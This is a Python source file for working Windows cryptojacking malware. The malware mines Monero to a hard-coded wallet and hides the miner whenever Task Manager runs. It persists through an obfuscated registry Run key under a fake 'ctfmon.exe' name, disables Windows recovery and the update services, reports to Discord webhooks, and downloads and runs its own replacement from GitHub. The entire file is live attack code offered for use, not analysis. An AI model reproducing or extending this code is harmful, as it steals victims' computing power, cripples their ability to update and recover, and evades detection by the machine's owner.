import os, sys, subprocess

# --- THE HYDRA ENGINE (WinServices.py v6.4 - BOOTSTRAP FIXED) ---
HIDE_WINDOW = 0x08000000 

def bootstrap():
    """Ensures dependencies are met while preserving command line arguments."""
    try:
        import requests, psutil
    except ImportError:
        work_dir = os.path.dirname(os.path.realpath(sys.executable))
        # Ensure we are in the embedded Lib path
        lib_path = os.path.join(work_dir, "Lib", "site-packages")
        if not os.path.exists(lib_path): os.makedirs(lib_path)
        
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil", "--target", lib_path], 
                              creationflags=HIDE_WINDOW)
        
        # RESTART: We use sys.argv to make sure --id and other flags are passed back
        # This fixes the 'second thing' where arguments were being dropped
        os.execv(sys.executable, [sys.executable] + sys.argv)

bootstrap()

import time, winreg, base64, argparse, platform, ctypes
import requests, psutil

# 1. Identity & Dual Webhook Setup
parser = argparse.ArgumentParser()
parser.add_argument("--id", default="svchost")
ID = parser.parse_known_args()[0].id

WEBHOOK_SYS = "https://discord.com/api/webhooks/1505276047342436503/LKZyvldidqNyp4__olrWpISFOnNL7v37EF-hK7Kd6S7j1oDFCCRXd0Z1Owi06w_E-XNl"
WEBHOOK_MINE = "https://discord.com/api/webhooks/1505276346644041899/hXVbSQLRBbDsERLeNlx2BIiZHGZbFFQtzHFH62Qzyzpsy-RYyUed9iCnWkJ3UASkzlOX"
WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
POOL = "pool.supportxmr.com:443"
UPDATE_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"

REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="]
PC_NAME = platform.node()
WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
SELF_PATH = os.path.realpath(__file__)

CONFIG = {
    "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
    "WATCH": "Taskmgr.exe",
    "IDLE_PWR": "90",
    "NORM_PWR": "25",
    "IDLE_SEC": 300
}

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

def get_idle_duration():
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        return millis / 1000.0
    return 0

def notify(msg, type="sys"):
    hook = WEBHOOK_SYS if type == "sys" else WEBHOOK_MINE
    full_msg = f"**[{PC_NAME} | {ID}]**: {msg}"
    try: requests.post(hook, json={"content": full_msg})
    except: pass

def engage_locks():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
        py_path = os.path.join(WORK_DIR, "python", "ctfmon.exe")
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{py_path}" "{SELF_PATH}" --id {ID}')
        winreg.CloseKey(key)
    except: pass
    
    try: subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=HIDE_WINDOW)
    except: pass
    
    try:
        for s in SVC_LIST:
            name = base64.b64decode(s).decode()
            subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=HIDE_WINDOW)
            subprocess.run(["sc", "stop", name], capture_output=True, creationflags=HIDE_WINDOW)
    except: pass

def auto_update():
    try:
        r = requests.get(UPDATE_URL)
        if r.status_code == 200:
            current_content = open(SELF_PATH, 'r').read()
            if r.text != current_content:
                with open(SELF_PATH, 'w') as f: f.write(r.text)
                notify("Shadow Sync: Respawning...", "sys")
                os.execv(sys.executable, [sys.executable, SELF_PATH, "--id", ID])
    except: pass

def manage_power():
    is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
    miner_proc = None
    current_power = "0"
    for p in psutil.process_iter(['name', 'exe', 'cmdline']):
        try:
            if p.info['name'] == f"{ID}.exe" and p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
                miner_proc = p
                if p.info['cmdline']:
                    for arg in p.info['cmdline']:
                        if arg == CONFIG["IDLE_PWR"] or arg == CONFIG["NORM_PWR"]:
                            current_power = arg
                break
        except: continue

    if is_monitored:
        if miner_proc:
            try: miner_proc.terminate()
            except: pass
    else:
        idle_time = get_idle_duration()
        target_pwr = CONFIG["IDLE_PWR"] if idle_time > CONFIG["IDLE_SEC"] else CONFIG["NORM_PWR"]
        if not miner_proc or current_power != target_pwr:
            if miner_proc:
                try: miner_proc.terminate()
                except: pass
            try:
                worker_id = f"{WALLET}.{PC_NAME}"
                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", worker_id, "--max-cpu-usage", target_pwr, "-k", "--tls"], 
                                 creationflags=HIDE_WINDOW)
            except: pass

def main():
    engage_locks()
    notify("SYSTEM ONLINE (v6.4 - Core Optimized)", "sys")
    last_update = time.time()
    while True:
        manage_power()
        if time.time() - last_update > 43200:
            auto_update()
            last_update = time.time()
        time.sleep(10)

if __name__ == "__main__":
    main()
